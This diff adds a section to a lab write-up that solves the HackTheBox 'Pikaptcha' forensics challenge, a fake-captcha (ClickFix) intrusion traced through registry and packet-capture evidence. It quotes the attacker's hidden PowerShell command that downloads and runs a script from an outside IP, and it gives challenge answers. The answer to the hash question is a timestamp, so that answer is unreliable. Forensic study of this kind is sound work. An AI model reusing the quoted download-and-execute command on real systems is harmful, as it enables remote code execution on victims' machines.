@@ -3734,6 +3734,61 @@ Answer: `26/04/2023 11:01:38`
 The size of `backup_1682506471_dcsr71p7fyijoyq8.sql.gz` is `34707` bytes.
 Answer: `34707`
 
+### X. Pikaptcha:
+> - Link lab: https://app.hackthebox.com/sherlocks/Pikaptcha?tab=play_sherlock
+> - Đề bài:
+> ![image](https://hackmd.io/_uploads/Hy1gupFPfx.png)
+
+#### 1. It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.
+Using FTK Imager to export `NTUSER.DAT`:
+![image](https://hackmd.io/_uploads/BJ3onatPGe.png)
+Analyse this file by Registry Explorer. In `\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`:
+![image](https://hackmd.io/_uploads/B1AgCaFDze.png)
+This location is where Windows stores commands running in `Windows` + `R`. ClickFix/Fake Captcha often takes advantages of this mechanism. It is so easy to see that `office2024install.ps1` was downloaded from the IP `43.205.115.44` and it was executed at `2024-09-23 05:07:45`.
+
+**Answer:** `powershell -NOP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"`
+
+#### 2. At what time in UTC did the malicious payload execute?
+**Answer:** `2024-09-23 05:07:45`
+
+#### 3. The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?
+Filter in WireShark:
+![image](https://hackmd.io/_uploads/SyMpe0tvzl.png)
+Go to `File` >>> `Export Objects` >>> `HTTP...` then export `office2024install.ps1`:
+![image](https://hackmd.io/_uploads/SyvHZRKDfe.png)
+Using PowerShell to get the sha256 hash of this exported file:
+![image](https://hackmd.io/_uploads/r1Y2z0Ywzl.png)
+
+**Answer:** `2025-09-03 07:31:05`
+
+#### 4. To which port did the reverse shell connect?
+By nature, reverse shell is outbound TCP/UDP connection from victim to C2 server. In `Statistics` >>> `Conversations` >>> `TCP`:
+![image](https://hackmd.io/_uploads/SkQDNCFvMe.png)
+The port that the reverse shell connect is `6969`.
+> Beside that, if we filter `ip.addr == 43.205.115.44`: 
+> ![image](https://hackmd.io/_uploads/Hy_rH0YvGg.png)
+
+**Answer:** `6969`
+
+#### 5. For how many seconds was the reverse shell connection established between C2 and the victim's workstation?
+Column `Duration` display numbers of seconds to establish a connect between C2 and victim:
+![image](https://hackmd.io/_uploads/rJETLAFvzl.png)
+
+**Answer:** `403`
+
+#### 6. Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim's clipboard?
+Read the content of exported file:
+![image](https://hackmd.io/_uploads/BkAMp0YwMg.png)
+Decode this base64 code to utf-16le format:
+![image](https://hackmd.io/_uploads/rkZ70CYvfg.png)
+There is no answer that we are looking for. Try another way, in WireShark, filter `ip.addr==43.205.115.44 and http`:
+![image](https://hackmd.io/_uploads/HJACgJ9PMl.png)
+I will check HTTP Stream of the first packet containing `GET`:
+![image](https://hackmd.io/_uploads/HJEKWk5vGe.png)
+There is a JavaScript script. As we can see, `stageClipboard` contains the malicious payload.
+
+**Answer:** `stageClipboard`
+
 ## DFIR-LAB:
 > Link lab: https://github.com/Azr43lKn1ght/DFIR-LABS
 
